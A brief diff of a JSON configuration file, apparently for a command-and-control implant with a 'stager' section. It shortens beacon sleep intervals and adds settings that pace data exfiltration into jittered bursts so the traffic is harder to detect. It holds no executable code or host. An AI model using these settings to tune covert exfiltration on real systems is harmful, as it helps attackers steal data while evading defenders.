@@ -23,8 +23,12 @@
     "timeout": 10,
     "max_command_length": 400,
     "retry_attempts": 3,
-    "sleep_min": 600,
-    "sleep_max": 1200
+    "sleep_min": 60,
+    "sleep_max": 120,
+    "exfil_jitter_min_ms": 10000,
+    "exfil_jitter_max_ms": 30000,
+    "exfil_chunks_per_burst": 5,
+    "exfil_burst_pause_ms": 120000
   },
   "stager": {
     "jitter_min_ms": 1000,
